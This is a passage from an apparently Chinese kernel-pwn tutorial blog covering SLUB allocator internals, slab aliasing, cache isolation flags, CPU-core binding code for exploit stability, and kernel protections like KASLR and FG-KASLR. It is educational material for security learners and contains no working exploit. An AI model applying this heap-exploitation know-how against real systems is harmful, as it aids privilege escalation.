class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * calculate_sizes() determines the order and the distribution of data within</span></span><br><span class="line"><span class="comment"> * a slab object.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">calculate_sizes</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">int</span> forced_order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">slab_flags_t</span> flags = s-&gt;flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size = s-&gt;object_size;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> order;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Round up object size to the next word boundary. We can only</span></span><br><span class="line"><span class="comment">	 * place the free pointer at word boundaries and this determines</span></span><br><span class="line"><span class="comment">	 * the possible location of the free pointer.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	size = ALIGN(size, <span class="keyword">sizeof</span>(<span class="type">void</span> *));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Determine if we can poison the object itself. If the user of</span></span><br><span class="line"><span class="comment">	 * the slab may touch the object after free or before allocation</span></span><br><span class="line"><span class="comment">	 * then we should never poison the object itself.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((flags &amp; SLAB_POISON) &amp;&amp; !(flags &amp; SLAB_TYPESAFE_BY_RCU) &amp;&amp;</span><br><span class="line">			!s-&gt;ctor)</span><br><span class="line">		s-&gt;flags |= __OBJECT_POISON;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		s-&gt;flags &amp;= ~__OBJECT_POISON;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If we are Redzoning then check if there is some space between the</span></span><br><span class="line"><span class="comment">	 * end of the object and the free pointer. If not then add an</span></span><br><span class="line"><span class="comment">	 * additional word to have some bytes to store Redzone information.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((flags &amp; SLAB_RED_ZONE) &amp;&amp; size == s-&gt;object_size)</span><br><span class="line">		size += <span class="keyword">sizeof</span>(<span class="type">void</span> *);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * With that we have determined the number of bytes in actual use</span></span><br><span class="line"><span class="comment">	 * by the object. This is the potential offset to the free pointer.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	s-&gt;inuse = size;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (((flags &amp; (SLAB_TYPESAFE_BY_RCU | SLAB_POISON)) ||</span><br><span class="line">		s-&gt;ctor)) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Relocate free pointer after the object if it is not</span></span><br><span class="line"><span class="comment">		 * permitted to overwrite the first word of the object on</span></span><br><span class="line"><span class="comment">		 * kmem_cache_free.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * This is the case if we do RCU, have a constructor or</span></span><br><span class="line"><span class="comment">		 * destructor or are poisoning the objects.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		s-&gt;offset = size;</span><br><span class="line">		size += <span class="keyword">sizeof</span>(<span class="type">void</span> *);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SLAB_STORE_USER)</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Need to store information about allocs and frees after</span></span><br><span class="line"><span class="comment">		 * the object.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		size += <span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> track);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	kasan_cache_create(s, &amp;size, &amp;s-&gt;flags);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SLAB_RED_ZONE) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Add some empty padding so that we can catch</span></span><br><span class="line"><span class="comment">		 * overwrites from earlier objects rather than let</span></span><br><span class="line"><span class="comment">		 * tracking information or the free pointer be</span></span><br><span class="line"><span class="comment">		 * corrupted if a user writes before the start</span></span><br><span class="line"><span class="comment">		 * of the object.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		size += <span class="keyword">sizeof</span>(<span class="type">void</span> *);</span><br><span class="line"></span><br><span class="line">		s-&gt;red_left_pad = <span class="keyword">sizeof</span>(<span class="type">void</span> *);</span><br><span class="line">		s-&gt;red_left_pad = ALIGN(s-&gt;red_left_pad, s-&gt;align);</span><br><span class="line">		size += s-&gt;red_left_pad;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * SLUB stores one object immediately after another beginning from</span></span><br><span class="line"><span class="comment">	 * offset 0. In order to align the objects we have to simply size</span></span><br><span class="line"><span class="comment">	 * each object to conform to the alignment.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	size = ALIGN(size, s-&gt;align);</span><br><span class="line">	s-&gt;size = size;</span><br><span class="line">	<span class="keyword">if</span> (forced_order &gt;= <span class="number">0</span>)</span><br><span class="line">		order = forced_order;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		order = calculate_order(size);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((<span class="type">int</span>)order &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	s-&gt;allocflags = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (order)</span><br><span class="line">		s-&gt;allocflags |= __GFP_COMP;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (s-&gt;flags &amp; SLAB_CACHE_DMA)</span><br><span class="line">		s-&gt;allocflags |= GFP_DMA;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (s-&gt;flags &amp; SLAB_RECLAIM_ACCOUNT)</span><br><span class="line">		s-&gt;allocflags |= __GFP_RECLAIMABLE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Determine the number of objects per slab</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	s-&gt;oo = oo_make(order, size);</span><br><span class="line">	s-&gt;min = oo_make(get_order(size), size);</span><br><span class="line">	<span class="keyword">if</span> (oo_objects(s-&gt;oo) &gt; oo_objects(s-&gt;max))</span><br><span class="line">		s-&gt;max = s-&gt;oo;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> !!oo_objects(s-&gt;oo);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">kmem_cache_open</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">slab_flags_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	s-&gt;flags = kmem_cache_flags(s-&gt;size, flags, s-&gt;name, s-&gt;ctor);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	s-&gt;random = get_random_long();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!calculate_sizes(s, <span class="number">-1</span>))</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line">	<span class="keyword">if</span> (disable_higher_order_debug) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Disable debugging flags that store metadata if the min slab</span></span><br><span class="line"><span class="comment">		 * order increased.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (get_order(s-&gt;size) &gt; get_order(s-&gt;object_size)) &#123;</span><br><span class="line">			s-&gt;flags &amp;= ~DEBUG_METADATA_FLAGS;</span><br><span class="line">			s-&gt;offset = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (!calculate_sizes(s, <span class="number">-1</span>))</span><br><span class="line">				<span class="keyword">goto</span> error;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_HAVE_CMPXCHG_DOUBLE) &amp;&amp; \</span></span><br><span class="line"><span class="meta">    defined(CONFIG_HAVE_ALIGNED_STRUCT_PAGE)</span></span><br><span class="line">	<span class="keyword">if</span> (system_has_cmpxchg_double() &amp;&amp; (s-&gt;flags &amp; SLAB_NO_CMPXCHG) == <span class="number">0</span>)</span><br><span class="line">		<span class="comment">/* Enable fast mode */</span></span><br><span class="line">		s-&gt;flags |= __CMPXCHG_DOUBLE;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The larger the object size is, the more pages we want on the partial</span></span><br><span class="line"><span class="comment">	 * list to avoid pounding the page allocator excessively.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	set_min_partial(s, ilog2(s-&gt;size) / <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	set_cpu_partial(s);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	s-&gt;remote_node_defrag_ratio = <span class="number">1000</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Initialize the pre-computed randomized freelist if slab is up */</span></span><br><span class="line">	<span class="keyword">if</span> (slab_state &gt;= UP) &#123;</span><br><span class="line">		<span class="keyword">if</span> (init_cache_random_seq(s))</span><br><span class="line">			<span class="keyword">goto</span> error;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!init_kmem_cache_nodes(s))</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (alloc_kmem_cache_cpus(s))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	free_kmem_cache_nodes(s);</span><br><span class="line">error:</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SLAB_PANIC)</span><br><span class="line">		panic(<span class="string">&quot;Cannot create slab %s size=%u realsize=%u order=%u offset=%u flags=%lx\n&quot;</span>,</span><br><span class="line">		      s-&gt;name, s-&gt;size, s-&gt;size,</span><br><span class="line">		      oo_order(s-&gt;oo), s-&gt;offset, (<span class="type">unsigned</span> <span class="type">long</span>)flags);</span><br><span class="line">	<span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="slub-分配"><a href="#slub-分配" class="headerlink" title="slub 分配"></a>slub 分配</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/f7f490f6f668b542aab003ec27135ad2.png"
                      alt="2.png"
                ></p>
<ul>
<li><p>kmem_cache 刚刚建立，还没有任何对象可供分配，此时只能从伙伴系统分配一个 slab ，如下图所示。<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/244cd82a22db3cb5168651580d622465.png"
                      alt="3.png"
                ></p>
</li>
<li><p>如果正在使用的 slab 有 free obj，那么就直接分配即可，这种是最简单快捷的。如下图所示。<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/df0e27a7cc01c0a1ab1b387409d7b8a4.png"
                      alt="4.png"
                ></p>
</li>
<li><p>随着正在使用的 slab 中 obj 的一个个分配出去，最终会无 obj 可分配，此时 per cpu partial 链表中有可用 slab 用于分配，那么就会从 per cpu partial 链表中取下一个 slab 用于分配 obj。如下图所示。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/3b2a9a9ff98bb492fa0cfef2dc1490f6.png"
                      alt="5.png"
                ></p>
</li>
<li><p>随着正在使用的 slab 中 obj 的一个个分配出去，最终会无 obj 可分配，此时 per cpu partial 链表也为空，此时发现 per node partial 链表中有可用 slab 用于分配，那么就会从 per node partial 链表中取下一个 slab 用于分配 obj。如下图所示。<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/e9439ea41be5d91a1bc8789c50e098ff.png"
                      alt="6.png"
                ></p>
</li>
</ul>
<h4 id="slub-释放"><a href="#slub-释放" class="headerlink" title="slub 释放"></a>slub 释放</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/06ab07e03d42cc6bd7f1079a157d0c6f.png"
                      alt="7.png"
                ></p>
<ul>
<li>假设下图左边的情况下释放 obj，如果满足 kmem_cache_node 的 nr_partial 大于 kmem_cache 的 min_partial 的话，释放情况如下图所示。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/8ee336b6de8e8263a5dfa2dad69c99dc.png"
                      alt="8.png"
                ></li>
<li>假设下图左边的情况下释放 obj，如果不满足 kmem_cache_node 的 nr_partial 大于 kmem_cache 的 min_partial 的话，释放情况如下图所示。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/11bad950de73843bef8e1716a85bdb0c.png"
                      alt="9.png"
                ></li>
<li>假设下图从 full slab 释放 obj 的话，如果满足 per cpu partial 管理的所有 slab 的 free object 数量大于 kmem_cache 的 cpu_partial 成员的话的话，将 per cpu partial 链表管理的所有 slab 移动到 per node partial 链表管理，释放情况如下图所示。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/583c765a6df44d6ffd56e4f506174318.png"
                      alt="10.png"
                ></li>
<li>假设下图从 full slab 释放 obj 的话，如果不满足 per cpu partial 管理的所有 slab 的 free object 数量大于 kmem_cache 的 cpu_partial 成员的话的话，释放情况如下图所示。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/0dc462afb4eebcf420803eca2491f169.png"
                      alt="11.png"
                ></li>
</ul>
<h4 id="内核堆利用与绑核"><a href="#内核堆利用与绑核" class="headerlink" title="内核堆利用与绑核"></a>内核堆利用与绑核</h4><p>slub allocator 会优先从当前核心的 <code>kmem_cache_cpu</code> 中进行内存分配，在多核架构下存在多个 <code>kmem_cache_cpu</code> ，由于进程调度算法会保持核心间的负载均衡，因此我们的 exp 进程可能会被在不同的核心上运行，这也就导致了利用过程中 kernel object 的分配有可能会来自不同的 <code>kmem_cache_cpu</code> ，这使得利用模型变得复杂，也降低了漏洞利用的成功率。</p>
<p>因此为了保证漏洞利用的稳定，<strong>我们需要将我们的进程绑定到特定的某个 CPU 核心上</strong>，这样 slub allocator 的模型对我们而言便简化成了 <code>kmem_cache_node + kmem_cache_cpu</code> ，我们也能更加方便地进行漏洞利用</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">randint</span><span class="params">(<span class="type">int</span> min, <span class="type">int</span> max)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> min + (rand() % (max - min));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">bool</span> fixed, <span class="type">bool</span> thread)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(fixed ? <span class="number">0</span> : randint(<span class="number">1</span>, get_nprocs()), &amp;cpu_set);</span><br><span class="line">    <span class="keyword">if</span> (thread) &#123;</span><br><span class="line">        pthread_setaffinity_np(pthread_self(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="通用-kmalloc-flag"><a href="#通用-kmalloc-flag" class="headerlink" title="通用 kmalloc flag"></a>通用 kmalloc flag</h4><p><code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code> 是内核中最为常见与通用的分配 flag，常规情况下他们的分配都来自同一个 <code>kmem_cache</code> ——即通用的 <code>kmalloc-xx</code></p>
<p>这两种 flag 的区别主要在于 <code>GFP_KERNEL_ACCOUNT</code> 比 <code>GFP_KERNEL</code> 多了一个属性——<strong>表示该对象与来自用户空间的数据相关联</strong>，因此我们可以看到诸如 <code>msg_msg</code> 、<code>pipe_buffer</code>、<code>sk_buff的数据包</code> 的分配使用的都是 <code>GFP_KERNEL_ACCOUNT</code> ，而 <code>ldt_struct</code> 、<code>packet_socket</code> 等与用户空间数据没有直接关联的结构体则使用 <code>GFP_KERNEL</code></p>
<p>在5.9 版本之前<code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code> 存在隔离机制，在 <a class="link"   target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/10befea91b61c4e2c2d1df06a2e978d182fcf792" >这个 commit<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 中取消了隔离机制，自内核版本 5.14 起，在 <a class="link"   target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/494c1dfe855ec1f70f89552fce5eadf4a1717552" >这个 commit<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 当中又重新引入：</p>
<ul>
<li>对于开启了 <code>CONFIG_MEMCG_KMEM</code> 编译选项的 kernel 而言（通常都是默认开启），其会为使用 <code>GFP_KERNEL_ACCOUNT</code> 进行分配的通用对象<strong>创建一组独立的 <code>kmem_cache</code> ——名为 <code>kmalloc-cg-\*</code></strong> ，从而导致使用这两种 flag 的 object 之间的隔离：</li>
</ul>
<h4 id="slab-alias"><a href="#slab-alias" class="headerlink" title="slab alias"></a>slab alias</h4><p>slab alias 机制是一种对同等&#x2F;相近大小 object 的 <code>kmem_cache</code> 进行<strong>复用</strong>的一种机制：当一个 <code>kmem_cache</code> 在创建时，若已经存在能分配相等&#x2F;近似大小的 object 的 <code>kmem_cache</code> ，则<strong>不会创建新的 kmem_cache，而是为原有的 kmem_cache 起一个 alias，作为“新的” kmem_cache 返回</strong>。</p>
<p>例如 <code>cred_jar</code> 是专门用以分配 <code>cred</code> 结构体的 <code>kmem_cache</code>，在 Linux 4.4 之前的版本中，其为 <code>kmalloc-192</code> 的 alias，即 cred 结构体与其他的 192 大小的 object 都会从同一个 <code>kmem_cache</code>——<code>kmalloc-192</code> 中分配。</p>
<p>对于初始化时设置了 <code>SLAB_ACCOUNT</code> 这一 flag 的 <code>kmem_cache</code> 而言，则会新建一个新的 <code>kmem_cache</code> 而非为原有的建立 alias，例如在新版的内核当中 <code>cred_jar</code> 与 <code>kmalloc-192</code> 便是两个独立的 <code>kmem_cache</code>，<strong>彼此之间互不干扰</strong>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Account to memcg */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG_KMEM</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> SLAB_ACCOUNT		((slab_flags_t __force)0x04000000U)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> SLAB_ACCOUNT		0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * initialise the credentials stuff</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __init <span class="title function_">cred_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* allocate a slab in which we can store credentials */</span></span><br><span class="line">	cred_jar = kmem_cache_create(<span class="string">&quot;cred_jar&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred), <span class="number">0</span>,</span><br><span class="line">			SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="内核保护机制"><a href="#内核保护机制" class="headerlink" title="内核保护机制"></a>内核保护机制</h1><h2 id="地址相关"><a href="#地址相关" class="headerlink" title="地址相关"></a>地址相关</h2><h3 id="KASLR-1"><a href="#KASLR-1" class="headerlink" title="KASLR"></a>KASLR</h3><p>内核地址空间布局随机化（Kernel Address Space Layout Randomization），开启后，允许<code>kernel image</code>加载到<code>VMALLOC</code>区域的任何位置。<br>间在未开启KASLR保护机制时，内核代码段的基址为 0xffffffff81000000 ，direct mapping area 的基址为 0xffff888000000000 。</p>
<h3 id="FG-KASLR"><a href="#FG-KASLR" class="headerlink" title="FG_KASLR"></a>FG_KASLR</h3><p>FG-KASLR （Function Granular Kernel Address Space Layout Randomization）：细粒度的kaslr，函数级别上的 KASLR 优化。<br><strong>注意，该保护只是在代码段打乱顺序，在数据段偏移不变，例如 <code>commit_creds</code> 函数的偏移改变但是 <code>init_cred</code> 的偏移不变。</strong></p>
<h3 id="CONFIG-MMAP-MIN-ADDR"><a href="#CONFIG-MMAP-MIN-ADDR" class="headerlink" title="CONFIG_MMAP_MIN_ADDR"></a>CONFIG_MMAP_MIN_ADDR</h3><p>内核空间和用户空间共享虚拟内存地址，因此需要防止用户空间 mmap 的内存从 0 开始，从而缓解空指针引用攻击。windows 系统从 win8 开始禁止在零页分配内存。从 linux 内核 2.6.22 开始可以使用 sysctl 设置 <code>mmap_min_addr</code> 来实现这一保护。</p>
<h3 id="CONFIG-RANDOMIZE-KSTACK-OFFSET"><a href="#CONFIG-RANDOMIZE-KSTACK-OFFSET" class="headerlink" title="CONFIG_RANDOMIZE_KSTACK_OFFSET"></a>CONFIG_RANDOMIZE_KSTACK_OFFSET</h3><div class="code-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/arch/x86/Kconfig b/arch/x86/Kconfig</span></span><br><span class="line"><span class="comment">index beea77046f9b..b9d449581eb6 100644</span></span><br><span class="line"><span class="comment">--- a/arch/x86/Kconfig</span></span><br><span class="line"><span class="comment">+++ b/arch/x86/Kconfig</span></span><br><span class="line"><span class="meta">@@ -150,6 +150,7 @@</span>  config X86</span><br><span class="line"> 	select HAVE_ARCH_TRANSPARENT_HUGEPAGE</span><br><span class="line"> 	select HAVE_ARCH_TRANSPARENT_HUGEPAGE_PUD if X86_64</span><br><span class="line"> 	select HAVE_ARCH_VMAP_STACK		if X86_64</span><br><span class="line"><span class="addition">+	select HAVE_ARCH_RANDOMIZE_KSTACK_OFFSET</span></span><br><span class="line"> 	select 